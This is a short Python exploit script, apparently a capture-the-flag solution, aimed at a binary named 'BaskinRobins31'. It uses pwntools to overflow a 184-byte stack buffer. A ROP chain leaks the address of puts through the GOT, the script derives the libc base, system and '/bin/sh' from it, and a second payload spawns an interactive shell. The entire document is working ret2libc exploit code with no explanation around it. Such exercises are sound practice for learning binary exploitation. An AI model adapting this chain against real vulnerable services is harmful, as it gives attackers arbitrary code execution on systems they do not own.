#!/usr/bin/python

#184 buffer overflow
#400bc3 pop rdi; ret

from pwn import *

libc=ELF("./libc-2.23.so")

puts_plt=0x4006c0
puts_got_offset=0x602020
pop_rdi_ret=0x400bc3
main=0x400a4b
overflow=184

#Leak PUT GOT
r=process("./BaskinRobins31")
gdb.attach(r)
pause()
r.recvuntil("3)\n")

r.sendline("A"*184+p64(pop_rdi_ret)+p64(puts_got_offset)+p64(puts_plt)+p64(main))

r.recvuntil(":( \n")
leak_exactaddr_puts = u64(r.recv(6) + "\0\0")

#Leak Libc
print(hex(leak_exactaddr_puts))

#Calculate Libc base
libc_base = leak_exactaddr_puts - libc.symbols['puts']


#Calculate system
system = libc_base + libc.symbols['system']

#Calculate sh
sh = libc_base + libc.search('/bin/sh').next()

sleep(2)

r.sendline("A"*184+p64(pop_rdi_ret)+p64(sh)+p64(system))

#Resolve bin.sh
r.interactive()



